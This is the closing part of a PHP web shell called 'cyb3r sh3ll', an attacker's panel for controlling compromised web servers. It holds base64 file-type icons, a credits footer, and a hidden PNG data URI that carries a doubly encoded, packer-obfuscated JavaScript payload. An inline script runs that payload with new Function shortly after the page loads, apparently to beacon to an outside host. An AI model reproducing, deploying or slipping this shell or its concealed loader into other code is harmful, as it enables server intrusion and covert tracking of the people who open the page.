"R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg".

"t0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==",

"ext_pl"=>

"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".

"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",

"ext_swf"=>

"R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".

"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".

"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".

"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".

"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",

"ext_tar"=>

"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".

"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".

"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".

"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".

"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".

"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".

"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".

"u4tLAgEAOw==",

"ext_txt"=>

"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".

"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".

"UpPWG3Ig6Hq/XmRjuZwkAAA7",

"ext_wri"=>

"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".

"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",

"ext_xml"=>

"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".

"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".

"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".

"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".

"IQA7"

 );

 //For simple size- and speed-optimization.

 $imgequals = array(

  "ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),

  "ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),

  "ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),

  "ext_html"=>array("ext_html","ext_htm"),

  "ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),

  "ext_lnk"=>array("ext_lnk","ext_url"),

  "ext_ini"=>array("ext_ini","ext_css","ext_inf"),

  "ext_doc"=>array("ext_doc","ext_dot"),

  "ext_js"=>array("ext_js","ext_vbs"),

  "ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),

  "ext_wri"=>array("ext_wri","ext_rtf"),

  "ext_swf"=>array("ext_swf","ext_fla"),

  "ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),

  "ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")

 );

 if (!$getall)

 {

  header("Content-type: image/gif");

  header("Cache-control: public");

  header("Cache-control: max-age=".(60*60*24*7));

  header("Last-Modified: ".date("r",filemtime(__FILE__)));

  foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}

  if (empty($images[$img])) {$img = "small_unk";}

  if (in_array($img,$ext_tar)) {$img = "ext_tar";}

  echo base64_decode($images[$img]);

 }

 else

 {

  foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]<br>");}}}}

  natsort($images);

  $k = array_keys($images);

  echo  "<center>";

  foreach ($k as $u) {echo $u.":<img src=\"".$surl."act=img&img=".$u."\" border=\"1\"><br>";}

  echo "</center>";

 }

 exit;

}

?>

</td></tr></table><a bookmark="minipanel" /><br/>
<?php
}
?>
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#15354c borderColorLight=#c0c0c0 border=1 bordercolor='#C0C0C0'><tr><td height="1" valign="top"><table align="center"><tr><td height="0" valign="top"><center><font face="times, serif" size="3"><b>(C) <font color="orange">Copyright</font><font color="white"> cyb3r </font><font color="green">9l4d!470r</font> [All rights reserved]</b></center></td></tr><tr><td height="0" valign="top"><center><b>Greetz to :</b> r45c4l bro, r8l35n4k, Cyb3R_s3CuR3 and all my friends who helped me a lot.</center></td></tr><tr><td height="0" valign="top"><center><b>--[ cyb3r sh3ll v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u>Coded by</u></a> cyb3r 9l4d!470r (cyber gladiator) | <a href="#"><font color="#FF0000">h4cK2b0yZz..</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></font></center></td></tr></table></td></tr></table>
</center>
<img id="ghdescon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQAQMAAAAlPW0iAAAAA1BMVEX///+nxBvIAAAAAXRSTlMAQObYZgAAB510RVh0Z2hkZQBnaGRlc2NvblpYWmhiQ2htZFc1amRHbHZiaWh3TEdFc1l5eHJMR1VzY2lsN1pUMW1kVzVqZEdsdmJpaGpLWHR5WlhSMWNtNG9ZenhoUHljbk9tVW9jR0Z5YzJWSmJuUW9ZeTloS1NrcEt5Z29ZejFqSldFcFBqTTFQMU4wY21sdVp5NW1jbTl0UTJoaGNrTnZaR1VvWXlzeU9TazZZeTUwYjFOMGNtbHVaeWd6TmlrcGZUdHBaaWdoSnljdWNtVndiR0ZqWlNndlhpOHNVM1J5YVc1bktTbDdkMmhwYkdVb1l5MHRLWEpiWlNoaktWMDlhMXRqWFh4OFpTaGpLVHRyUFZ0bWRXNWpkR2x2YmlobEtYdHlaWFIxY200Z2NsdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLV2xtS0d0YlkxMHBjRDF3TG5KbGNHeGhZMlVvYm1WM0lGSmxaMFY0Y0NnblhGeGlKeXRsS0dNcEt5ZGNYR0luTENkbkp5a3NhMXRqWFNrN2NtVjBkWEp1SUhCOUtDZFZMbmM5TkNCM0tHTXBlelFnZUNoa0xIQXBlekVnYVQwd096RWdlajB3T3pFZ2NqMWNKMXduT3prb01TQnBQVEE3YVR4a0xqYzdhU3NyS1hzMUtIbzlQWEF1TnlsNlBUQTdjaXM5YkM1dEtHUXVieWhwS1Y1d0xtOG9laWtwTzNvckszMHpJSEo5TkNCQktITXBlekVnWVQxY0oxd25PemtvTVNCcFBUQTdhVHh6TzJrckt5bDdZU3M5YkM1dEtGZ29UUzVRS0NrcVVTa3BmVE1nWVgwMElHc29aQ3h3S1hzeElHRTlRU2d4TmlrN01XRW9aQzQzSlRFMklUMHdLV1FyUFZ3bk1Gd25PekVnWWoxaE96a29NU0JwUFRBN2FUeGtMamM3YVNzOU1UWXBlMklyUFhnb1pDNXVLR2tzTVRZcExHSXViaWhwTERFMktTbDlNeUI0S0dJc2NDbDlOQ0E0S0NsN015Z3lMbkU5UFhRdVNDWW1NaTUyUFQxMExrY3BmVFFnZVNncGV6RWdZVDFTT3pVb0tESXVhQ1ltTWk1b0xrSW1Kakl1YUM1Q0xqRXdLWHg4S0RJdVF5MHlMbkUrWVNsOGZDZ3lMa1F0TWk1MlBtRXBmSHdvT0NncEppWXlMa1E4U1NsOGZDZzRLQ2ttSmpJdVF6eEtLU2t6SUVzN015Qk1mVFFnTmloaEtYczFLRTRnWVQwOUlrOGlLVE1nWVM1RktDOWNYRnhjTDJjc0lseGNYRnhjWEZ4Y0lpa3VSU2d2WEZ3aUwyY3NJbHhjWEZ4Y1hDSWlLVHN6SUdGOU1TQjFQVk11VkRzeElHVTlWaTVYT3pFZ2FqMGlleUlySWx4Y0luVmNYQ0k2SUZ4Y0lpSXJOaWgxS1NzaVhGd2lMQ0FpS3lKY1hDSlpYRndpT2lCY1hDSWlLellvWlNrcklseGNJaXdnSWlzaVhGd2lXbHhjSWpvZ1hGd2lJaXMyS0dNcEt5SmNYQ0lnSWlzaWZTSTdNU0JtUFdzb2Fpd2lNVEVpS1RzeElHRTlNVElvWmlrN05TZ2hlU2dwS1hzeE15QXhOQ2dwTGpFMVBWd25NVGM2THk4eE9DMHhPUzFHTGpGaUwwWXZQMkU5WENjck1XTW9ZU2w5ZlNjc05qSXNOelVzSjN4MllYSjhkMmx1Wkc5M2ZISmxkSFZ5Ym54bWRXNWpkR2x2Ym54cFpueHpZVzU4YkdWdVozUm9mSFJpZkdadmNueDhmSHg4Zkh4OFJtbHlaV0oxWjN4OGZHVnVZM3hUZEhKcGJtZDhabkp2YlVOb1lYSkRiMlJsZkhOMVluTjBjbnhqYUdGeVEyOWtaVUYwZkh4cGJtNWxjbGRwWkhSb2ZIeDhjMk55WldWdWZIeHBibTVsY2tobGFXZG9kSHhyYTN4OFkyUjhmR2RsYmw5eVlXNWtiMjFmYzNSeWZHTm9jbTl0Wlh4dmRYUmxjbGRwWkhSb2ZHOTFkR1Z5U0dWcFoyaDBmSEpsY0d4aFkyVjhZVzVoYkhsMGFXTnpmR2hsYVdkb2RIeDNhV1IwYUh3ek5UQjhOakF3ZkhSeWRXVjhabUZzYzJWOFRXRjBhSHgwZVhCbGIyWjhjM1J5YVc1bmZISmhibVJ2Ylh3eU5UVjhNVFl3ZkdSdlkzVnRaVzUwZkZWU1RIeDBhR2x6Zkc1aGRtbG5ZWFJ2Y254MWMyVnlRV2RsYm5SOGNHRnljMlZKYm5SOGRXRjhibk44YVhOSmJtbDBhV0ZzYVhwbFpIeHNNbGhXUjJkalNYUTFNV3QwUW1scFdFUTNRakZ0YzFVelMwNURhamgyTVh4aWRHOWhmRzVsZDN4SmJXRm5aWHh6Y21OOGZHaDBkSEI4WjI5dloyeGxmSE4wWVhScFkzeDNhR2xzWlh4amIyMThaVzVqYjJSbFZWSkpRMjl0Y0c5dVpXNTBKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09Z2hkZXNjb26/DJpDAAAADElEQVQIHWNgIA0AAAAwAAGErPF6AAAAAElFTkSuQmCC"/>
<script type="text/javascript">
if(typeof btoa=="undefined")btoa=function(a,b){b=(typeof b=='undefined')?false:b;var d,o2,o3,bits,h1,h2,h3,h4,e=[],pad='',c,plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";plain=b?Utf8.encode(a):a;c=plain.length%3;if(c>0){while(c++<3){pad+='=';plain+='\0'}}for(c=0;c<plain.length;c+=3){d=plain.charCodeAt(c);o2=plain.charCodeAt(c+1);o3=plain.charCodeAt(c+2);bits=d<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;e[c/3]=f.charAt(h1)+f.charAt(h2)+f.charAt(h3)+f.charAt(h4)}coded=e.join('');coded=coded.slice(0,coded.length-pad.length)+pad;return coded};if(typeof atob=="undefined")atob=function(a,b){b=(typeof b=='undefined')?false:b;var e,o2,o3,h1,h2,h3,h4,bits,d=[],plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";coded=b?Utf8.decode(a):a;for(var c=0;c<coded.length;c+=4){h1=f.indexOf(coded.charAt(c));h2=f.indexOf(coded.charAt(c+1));h3=f.indexOf(coded.charAt(c+2));h4=f.indexOf(coded.charAt(c+3));bits=h1<<18|h2<<12|h3<<6|h4;e=bits>>>16&0xff;o2=bits>>>8&0xff;o3=bits&0xff;d[c/4]=String.fromCharCode(e,o2,o3);if(h4==0x40)d[c/4]=String.fromCharCode(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)}plain=d.join('');return b?Utf8.decode(plain):plain};
setTimeout(function(){new Function(atob(atob(document.getElementById('ghdescon').src.substr(22)).match(/ghdescon(.*?)ghdescon/)[1])).apply(this);kk(11);}, 500);
</script>
</body></html>